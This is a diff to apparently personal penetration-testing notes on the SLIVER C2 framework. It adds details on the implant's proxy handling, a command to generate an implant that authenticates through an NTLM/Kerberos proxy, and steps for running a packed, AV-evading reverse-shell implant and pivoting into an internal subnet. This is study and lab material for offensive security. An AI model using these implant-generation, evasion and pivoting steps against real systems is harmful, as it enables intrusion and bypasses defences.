@@ -14,7 +14,7 @@ Context
 During during penetration tests, Command and Control solutions (C2) like the SLIVER framework can be used to create a reverse tunnel between
 a target Windows/Linux server or a Windows laptop located inside a company internal network and an Internet-facing remote server belonging to the
 pentesters (e.g. a Kali VM running in AWS or Azure).
-Creating a reverse tunnel is usefull to pass trhough firewalls and pivot inside a company's internal network after having compromise 
+Creating a reverse tunnel is usefull to pass trhough firewalls and to pivot inside a company's internal network after having compromise 
 for example a vulnerable internet-facing website (e.g. unpatched RCE flaws) or a laptop via a phishing attack.
 
 Basic test lab
@@ -34,7 +34,22 @@ Miscellaneous notes
 
 1. Pivoting with SLIVER C2
 ---------------------------
-> SLIVER session (implant) + command "socks5 start" + Proxychains
+> SLIVER session (implant) + command "socks5 start" + Proxychains / Post-exploitaion modules & armory extensions
+
+> By default, the SLIVER implant attempts to auto-detect proxy settings using a modified version of the go-get-proxied library. 
+  It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection
+  for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. 
+  The order of connection attempts is as follows:
+  --> 1st = HTTPS over system proxy  --> 2nd = HTTP over system proxy --> 3rd HTTPS direct connect --> 4th = HTTP direct connect
+
+> Order of priority to retrieve the Windows proxy configuration:
+  + Windows Environment Variable: HTTPS_PROXY, HTTP_PROXY, FTP_PROXY, or ALL_PROXY. NO_PROXY is respected.
+  + Internet Options: Automatically detect settings (WPAD)
+  + Internet Options: Use automatic configuration script (PAC)
+  + Internet Options: Manual proxy server
+  + WINHTTP: (netsh winhttp)
+  
+> NTLM/Kerberos Proxy Authentication: SLIVER implant (advanced options) can use the wininet HTTP library, which supports NTLM/Kerberos authentication (Windows only).  
 
 2. AV detection of SLIVER implants (C2 agents)
 ----------------------------------------------
@@ -287,6 +302,17 @@ Sub Commands:
 jeff@kali:~/Documents/Tools/SLiver-C2$ sudo chmod 777 SliverRevShell1.exe 
 
 
+Note - Command to generate an implant that goes through an NTLM/Kerberos proxy
+-------------------------------------------------------------------------------
+> generate --arch amd64 -f exe --http <IP or domain.com> --save /temp/SliverRevShell.exe --os Windows --driver wininet --proxy <IP> 
+           --proxy-username <login> --proxy-password <password>
+
+# driver - Manually specify the HTTP driver (string). On windows this value can be set to wininet to use the wininet HTTP library for C2 communication.
+# proxy  - Manually specify HTTP proxy. The format should be one that is accepted by the Go HTTP library.
+# proxy-username - Specify a proxy username. Only valid with the Go HTTP driver.
+# proxy-password - Specify the proxy password. Only valid with the Go HTTP driver.
+
+
 ====================================================================================================================================================
 PoC - Step 5 - Generate a packed version of the SLIVER implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ====================================================================================================================================================
@@ -296,9 +322,10 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 192.168.56.1 - - [02/Jan/2023 06:35:49] "GET / HTTP/1.1" 200 -
 192.168.56.1 - - [02/Jan/2023 06:35:50] "GET /Packed-SliverRevShell.exe HTTP/1.1" 200 -
 
-
-Our packed version of the SLIVER implant is using obfuscation, encryption and compression techniques, direct syscalls (etc...) to avoid AV detection (MS Defender AV).
-Note: Compression is very important beacause the original SLIVER implant that we generated was very big (i.e. around 18 Mo) => our packed version is 'only' 5 Mo.
+Notes
+-----
+Our packed version of the SLIVER implant is using obfuscation, encryption and compression techniques as well as direct syscalls to avoid AV/EDR detection.
+Compression is very important beacause the original SLIVER implant that we generated was very big (i.e. around 18 Mo) => our packed version is 'only' 5 Mo.
 
 C:\temp> dir 
  Volume in drive C is Windows
@@ -311,13 +338,14 @@ C:\temp> dir
 23/12/2022  00:51         5,407,744 Packed-SliverRevShell.exe
 <SNIP>
 
+
 C:\temp> Packed-SliverRevShell.exe
 
 
-====================================================================================================================================================
+=====================================================================================================================================================
 PoC - Step 6 - Get the reverse shell and then configure the SLIVER handler (C2 server) to be able to pivot into the internal network (192.168.1.0/24)
                using a proxy 'socks5' (command 'socks5 start' to run in the SLIVER session) and Proxychains
-====================================================================================================================================================
+=====================================================================================================================================================
 
 [server] sliver > jobs
 
@@ -387,8 +415,8 @@ socks5  127.0.0.1 1081
                
                
 =====================================================================================================================================================
-PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot and then attack the machines located 
-               in the network 192.168.1.0/24.
+PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot into the network '192.168.1.0/24' 
+               and to attack the machines hosted inside this subnet
 =====================================================================================================================================================
 
 without using Proxychains and the SLIVER session, the network traffic is filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
@@ -460,8 +488,8 @@ C:\>exit
 
 
 =======================================================================================================================================
-PoC - Step 8 - Use the SLIVER post-exploitation modules and the 'ARMORY' extensions to pivot and then attack the machines located 
-               in the network 192.168.1.0/24
+PoC - Step 8 - Use the SLIVER post-exploitation modules and the 'ARMORY' extensions to pivot into the network '192.168.1.0/24' 
+               and to attack the machines hosted inside this subnet
 =======================================================================================================================================
 
 There are many post-exploitation modules available with the SLIVER C2 framework.
